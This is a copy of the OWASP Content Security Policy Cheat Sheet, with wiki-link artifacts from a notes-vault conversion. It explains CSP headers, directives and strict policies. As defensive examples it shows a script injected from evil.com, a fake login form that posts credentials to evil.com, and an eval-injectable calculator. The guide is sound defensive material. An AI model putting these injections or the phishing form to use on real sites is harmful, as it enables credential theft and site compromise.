---
title: "Content Security Policy Cheat Sheet"
source: "[[_content/dictionary#O|OWASP]] Cheatsheet"
source_url: "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"
created: "1741872881.7779374"
tags: [owasp, cheatsheet, security]
---
# Content Security Policy

## Content Security Policy Cheat Sheet[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[¶](#references)](#refactoring-inline-code)](#preventing-framing-attacks-clickjacking-cross-site-leaks)](#upgrading-insecure-requests)](#basic-non-strict-csp-policy)](#hash-based-strict-policy)](#nonce-based-strict-policy)](#strict-policy)](#csp-sample-policies)](#special-directive-sources)](#reporting-directives)](#navigation-directives)](#document-directives)](#fetch-directives)](#detailed-csp-directives)](#strict-dynamic)](#note)](#hashes)](#warning_1)](#nonce-based)](#strict-csp)](#csp-types-granularallowlist-based-or-strict)](#warning)](#3-content-security-policy-meta-tag)](#2-content-security-policy-report-only-header)](#1-content-security-policy-header)](#policy-delivery)](#defense-in-depth)](#defense-against-framing-attacks)](#5-restricting-[object](https://developer.mozilla.org/en-[[_content/dictionary#U|US]]/docs/Web/[[_content/dictionary#H|HTML]]/Element/object)s)](#4-restricting-form-submissions)](#3-restricting-unsafe-javascript)](#2-restricting-remote-scripts)](#1-restricting-inline-scripts)](#defense-against-xss)](#context)](#introduction)](#content-security-policy-cheat-sheet)
### Introduction¶
This article brings forth a way to integrate the defense in depth concept to the client-side of web applications. By injecting the [- Content-Security-Policy](https://content-security-policy.com/) ([[_content/dictionary#C|CSP]]) headers from the server, the browser is aware and capable of protecting the user from dynamic calls that will load content into the page currently being visited.
### Context¶
The increase in XSS (Cross-Site Scripting), clickjacking, and cross-site leak vulnerabilities demands a more defense in depth security approach.
#### Defense against [[_content/dictionary#X|XSS]]¶
CSP defends against XSS attacks in the following ways:
##### 1. Restricting Inline Scripts¶
By preventing the page from executing inline scripts, attacks like injecting
<script>document.body.innerHTML='defaced'</script>

will not work.
##### 2. Restricting Remote Scripts¶
By preventing the page from loading scripts from arbitrary servers, attacks like injecting
<script src="https://evil.com/hacked.js"></script>

will not work.
##### 3. Restricting Unsafe [[_content/dictionary#J|JavaScript]]¶
By preventing the page from executing text-to-JavaScript functions like eval, the website will be safe from vulnerabilities like the this:
// A Simple Calculator
var op1 = getUrlParameter("op1");
var op2 = getUrlParameter("op2");
var sum = eval(`${op1} + ${op2}`);
console.log(`The sum is: ${sum}`);

##### 4. Restricting Form submissions¶
By restricting where [[_content/dictionary#H|HTML]] forms on your website can submit their data, injecting phishing forms won't work either.
<form method="[[_content/dictionary#P|POST]]" action="https://evil.com/collect">
<h3>Session expired! Please login again.</h3>
<label>Username</label>
<input type="text" name="username"/>

<label>Password</label>
<input type="password" name="pass"/>

<input type="Submit" value="Login"/>
</form>

##### 5. Restricting Objects¶
And by restricting the [[_content/dictionary#H|HTML]] object tag, it also won't be possible for an attacker to inject malicious flash/Java/other legacy executables on the page.
#### Defense against framing attacks¶
Attacks like clickjacking and some variants of browser side-channel attacks (xs-leaks) require a malicious website to load the target website in a frame.
Historically the X-Frame-Options header has been used for this, but it has been obsoleted by the frame-ancestors [[_content/dictionary#C|CSP]] directive.
#### Defense in Depth¶
A strong CSP provides an effective second layer of protection against various types of vulnerabilities, especially [[_content/dictionary#X|XSS]]. Although CSP doesn't prevent web applications from containing vulnerabilities, it can make those vulnerabilities significantly more difficult for an attacker to exploit.
Even on a fully static website, which does not accept any user input, a CSP can be used to enforce the use of [Subresource Integrity ([[_content/dictionary#S|SRI]])](https://developer.mozilla.org/en-[[_content/dictionary#U|US]]/docs/Web/Security/Subresource_Integrity). This can help prevent malicious code from being loaded on the website if one of the third-party sites hosting [[_content/dictionary#J|JavaScript]] files (such as analytics scripts) is compromised.
With all that being said, CSP should not be relied upon as the only defensive mechanism against XSS. You must still follow good development practices such as the ones described in [[Cross_Site_Scripting_Prevention_Cheat_Sheet|Cross-Site Scripting Prevention Cheat Sheet]], and then deploy CSP on top of that as a bonus security layer.
### Policy Delivery¶
You can deliver a Content Security Policy to your website in three ways.
#### 1. Content-Security-Policy Header¶
Send a Content-Security-Policy [[_content/dictionary#H|HTTP]] response header from your web server.
Content-Security-Policy: ...

Using a header is the preferred way and supports the full [[_content/dictionary#C|CSP]] feature set. Send it in all [[_content/dictionary#H|HTTP]] responses, not just the index page.
This is a W3C Spec standard header. Supported by [Firefox](https://addons.mozilla.org/en-[[_content/dictionary#U|US]]/firefox/addon/csp-generator/) 23+, [Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc) 25+ and Opera 19+
#### 2. Content-Security-Policy-Report-Only Header¶
Using the Content-Security-Policy-Report-Only, you can deliver a CSP that doesn't get enforced.
Content-Security-Policy-Report-Only: ...

Still, violation reports are printed to the console and delivered to a violation endpoint if the report-to and report-uri directives are used.
This is also a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking ("fail open") and a report is sent to the [[_content/dictionary#U|URL]] designated by the report-uri (or newer report-to) directive. This is often used as a precursor to utilizing [[_content/dictionary#C|CSP]] in blocking mode ("fail closed")
Browsers fully support the ability of a site to use both Content-Security-Policy and Content-Security-Policy-Report-Only together, without any issues. This pattern can be used for [example](https://csp.withgoogle.com/docs/faq.html#static-content) to run a strict Report-Only policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).
#### 3. Content-Security-Policy Meta Tag¶
Sometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your [[_content/dictionary#H|HTML]] files in a [[_content/dictionary#C|CDN]] where the headers are out of your control.
In this case, you can still use CSP by specifying a http-equiv meta tag in the HTML markup, like so:
<meta http-equiv="Content-Security-Policy" content="...">

Almost everything is still supported, including full [[_content/dictionary#X|XSS]] defenses. However, you will not be able to use [framing protections](https://developer.mozilla.org/en-[[_content/dictionary#U|US]]/docs/Web/[[_content/dictionary#H|HTTP]]/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).
#### [[_content/dictionary#W|WARNING]]¶
[[_content/dictionary#D|DO]] [[_content/dictionary#N|NOT]] use X-Content-Security-Policy or X-[[_content/dictionary#W|WebKit]]-CSP. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.
### [[_content/dictionary#C|CSP]] Types (granular/allowlist based or strict)¶
The original mechanism for building a CSP involved creating allow-lists which would define the content and sources that were permitted in the context of the [[_content/dictionary#H|HTML]] page.
However, current leading practice is to create a "Strict" CSP which is much easier to deploy and more secure as it is less likely to be bypassed.
### [- Strict [[_content/dictionary#C|CSP]]](https://web.dev/strict-csp)¶
A strict CSP can be created by using a limited number of the granular [Fetch Directives listed below](#fetch-directives) listed below along with one of two mechanisms:

- Nonce based
- Hash based

The strict-dynamic directive can optionally also be used to make it easier to implement a Strict [[_content/dictionary#C|CSP]].
The following sections will provide some basic guidance to these mechanisms but it is strongly recommended to follow Google's detailed and methodological [instructions](https://web.dev/strict-csp) for creating a Strict CSP:
[Mitigate cross-site scripting ([[_content/dictionary#X|XSS]]) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)
#### Nonce based¶
Nonces are unique one-time-use random values that you generate for each [[_content/dictionary#H|HTTP]] response, and add to the Content-Security-Policy header, like so:
const nonce = uuid.v4();
scriptSrc += ` 'nonce-${nonce}'`;

You would then pass this nonce to your view (using nonces requires a non-static [[_content/dictionary#H|HTML]]) and render script tags that look something like this:
<script nonce="<%= nonce %>">
    ...
</script>

##### Warning¶
Don't create a middleware that replaces all script tags with "script nonce=..." because attacker-injected scripts will then get the nonces as well. You need an actual [[_content/dictionary#H|HTML]] templating engine to use nonces.
#### Hashes¶
When inline scripts are required, the script-src 'hash_algo-hash' is another option for allowing only specific scripts to execute.
Content-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='

To get the hash, look at Google Chrome developer tools for violations like this:

❌ Refused to execute inline script because it violates the following Content Security Policy directive: "..." Either the 'unsafe-inline' keyword, a hash ('sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='), or a nonce...

You can also use this [hash generator](https://report-uri.com/home/hash). This is a great example of using hashes.
##### Note¶
Using hashes can be a risky approach. If you change anything inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.
#### strict-dynamic¶
The strict-dynamic directive can be used as part of a Strict CSP in combination with either hashes or nonces.
If a script block which has either the correct hash or nonce is creating additional [[_content/dictionary#D|DOM]] elements and executing [[_content/dictionary#J|JS]] inside of them, strict-dynamic tells the browser to trust those elements as well without having to explicitly add nonces or hashes for each one.
Note that whilst strict-dynamic is a CSP level 3 feature, CSP level 3 is very widely supported in common, modern browsers.
For more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).
### Detailed [[_content/dictionary#C|CSP]] Directives¶
Multiple types of directives exist that allow the developer to control the flow of the policies granularly. Note that creating a non-Strict policy that is too granular or permissive is likely to lead to bypasses and a loss of protection.
#### Fetch Directives¶
Fetch directives tell the browser the locations to trust and load resources from.
Most fetch directives have a certain [fallback list specified in w3](https://www.w3.org/[[_content/dictionary#T|TR]]/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.

- child-src allows the developer to control nested browsing contexts and worker execution contexts.
- connect-src provides control over fetch requests, [[_content/dictionary#X|XHR]], eventsource, beacon and websockets connections.
- font-src specifies which URLs to load fonts from.
- img-src specifies the URLs that images can be loaded from.
- manifest-src specifies the URLs that application manifests may be loaded from.
- media-src specifies the URLs from which video, audio and text track resources can be loaded from.
- prefetch-src specifies the URLs from which resources can be prefetched from.
- object-src specifies the URLs from which plugins can be loaded from.
- script-src specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.
- - script-src-elem controls the location from which execution of script requests and blocks can occur.
- - script-src-attr controls the execution of event handlers.

- style-src controls from where styles get applied to a document. This includes <link> elements, @import rules, and requests originating from a Link [[_content/dictionary#H|HTTP]] response header field.
- - style-src-elem controls styles except for inline attributes.
- - style-src-attr controls styles attributes.

- default-src is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of default-src.

#### Document Directives¶
Document directives instruct the browser about the properties of the document to which the policies will apply to.

- base-uri specifies the possible URLs that the <base> element can use.
- plugin-types limits the types of resources that can be loaded into the document (e.g. application/pdf). 3 rules apply to the affected elements, <embed> and <object>:
- - The element needs to explicitly declare its type.
- - The element's type needs to match the declared type.
- - The element's resource needs to match the declared type.

sandbox restricts a page's actions such as submitting forms.
- - Only applies when used with the request header Content-Security-Policy.
- - Not specifying a value for the directive activates all of the sandbox restrictions. Content-Security-Policy: sandbox;
[- - Sandbox syntax](https://developer.mozilla.org/en-[[_content/dictionary#U|US]]/docs/Web/[[_content/dictionary#H|HTTP]]/Headers/Content-Security-Policy/sandbox#Syntax)

#### Navigation Directives¶
Navigation directives instruct the browser about the locations that the document can navigate to or be embedded from.

- form-action restricts the URLs which the forms can submit to.
- frame-ancestors restricts the URLs that can embed the requested resource inside of  <frame>, <iframe>, <object>, <embed>, or <applet> elements.
- - If this directive is specified in a <meta> tag, the directive is ignored.
- - This directive doesn't fallback to the default-src directive.
- - X-Frame-Options is rendered obsolete by this directive and is ignored by the user agents.

#### Reporting Directives¶
Reporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.

report-to which is a group name defined in the header in a [[_content/dictionary#J|JSON]] formatted header value.
[- - [[_content/dictionary#M|MDN]] report-to documentation](https://developer.mozilla.org/en-[[_content/dictionary#U|US]]/docs/Web/[[_content/dictionary#H|HTTP]]/Headers/Content-Security-Policy/report-to)

- report-uri directive is deprecated by report-to, which is a [[_content/dictionary#U|URI]] that the reports are sent to.
- - Goes by the format of: Content-Security-Policy: report-uri https://example.com/csp-reports

In order to ensure backward compatibility, use the 2 directives in conjunction. Whenever a browser supports report-to, it will ignore report-uri. Otherwise, report-uri will be used.
#### Special Directive Sources¶

Value
Description

'none'
No URLs match.

'self'
Refers to the origin site with the same scheme and port number.

'unsafe-inline'
Allows the usage of inline scripts or styles.

'unsafe-eval'
Allows the usage of eval in scripts.

To better understand how the directive sources work, check out the [source lists from w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).
### [[_content/dictionary#C|CSP]] Sample Policies¶
#### Strict Policy¶
A strict policy's role is to protect against classical stored, reflected, and some of the [[_content/dictionary#D|DOM]] [[_content/dictionary#X|XSS]] attacks and should be the optimal goal of any team trying to implement CSP.
As noted above, Google went ahead and set up a detailed and methodological instructions for creating a Strict CSP.
Based on those instructions, one of the following two policies can be used to apply a strict policy:
##### Nonce-based Strict Policy¶
Content-Security-Policy:
  script-src 'nonce-{[[_content/dictionary#R|RANDOM]]}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';

##### Hash-based Strict Policy¶
Content-Security-Policy:
  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';

#### Basic non-Strict [[_content/dictionary#C|CSP]] Policy¶
This policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.
If your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.
The most basic policy assumes:

- All resources are hosted by the same domain of the document.
- There are no inlines or evals for scripts and style resources.
- There is no need for other websites to frame the website.
- There are no form-submissions to external websites.

Content-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';

To tighten further, one can apply the following:
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';

This policy allows images, scripts, [[_content/dictionary#A|AJAX]], and [[_content/dictionary#C|CSS]] from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).
#### Upgrading insecure requests¶
If the developer is migrating from [[_content/dictionary#H|HTTP]] to [[_content/dictionary#H|HTTPS]], the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:
Content-Security-Policy: upgrade-insecure-requests;

#### Preventing framing attacks (clickjacking, cross-site leaks)¶

- To prevent all framing of your content use:
- - Content-Security-Policy: frame-ancestors 'none';

- To allow for the site itself, use:
- - Content-Security-Policy: frame-ancestors 'self';

- To allow for trusted domain, do the following:
- - Content-Security-Policy: frame-ancestors trusted.com;

#### Refactoring inline code¶
When default-src or script-src* directives are active, [[_content/dictionary#C|CSP]] by default disables any [[_content/dictionary#J|JavaScript]] code placed inline in the [[_content/dictionary#H|HTML]] source, such as this:
<script>
var foo = "314"
<script>

The inline code can be moved to a separate [[_content/dictionary#J|JavaScript]] file and the code in the page becomes:
<script src="app.js">
</script>

With app.js containing the var foo = "314" code.
The inline code restriction also applies to inline event handlers, so that the following construct will be blocked under [[_content/dictionary#C|CSP]]:
<button id="button1" onclick="doSomething()">

This should be replaced by addEventListener calls:
document.getElementById("button1").addEventListener('click', doSomething);

### References¶

Strict CSP
[- [[_content/dictionary#C|CSP]] Level 3 W3C](https://www.w3.org/[[_content/dictionary#T|TR]]/CSP3/)
Content-Security-Policy
[- [[_content/dictionary#M|MDN]] CSP](https://developer.mozilla.org/en-[[_content/dictionary#U|US]]/docs/Web/[[_content/dictionary#H|HTTP]]/Headers/Content-Security-Policy)
[- CSP Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)
[- CSP [[_content/dictionary#C|CheatSheet]] by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)
[- Breaking Bad CSP](https://www.slideshare.net/[[_content/dictionary#L|LukasWeichselbaum]]/breaking-bad-csp)
[- CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)
[- Content Security Policy Guide on [[_content/dictionary#A|AppSec]] Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)
- CSP Generator: Chrome/Firefox
[- CSP evaluator](https://csp-evaluator.withgoogle.com/)